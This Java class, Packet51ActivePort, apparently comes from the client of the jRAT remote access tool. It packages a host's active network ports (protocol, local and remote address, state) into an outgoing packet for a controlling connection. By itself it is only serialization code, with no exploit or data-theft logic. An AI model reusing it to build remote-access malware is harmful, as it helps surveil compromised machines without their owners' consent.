package jrat.client.packets.outgoing;

import jrat.client.Connection;


public class Packet51ActivePort implements OutgoingPacket {

	private String protocol;
	private String address;
	private String remoteAddress;
	private String state;

	public Packet51ActivePort(String protocol, String address, String state, String remoteAddress) {
		this.protocol = protocol;
		this.address = address;
		this.state = state;
		this.remoteAddress = remoteAddress;
	}

	@Override
	public void write(Connection dos) throws Exception {
		dos.writeLine(protocol);
		dos.writeLine(address);
		dos.writeLine(remoteAddress);
		dos.writeLine(state);
	}

	@Override
	public short getPacketId() {
		return 51;
	}

}
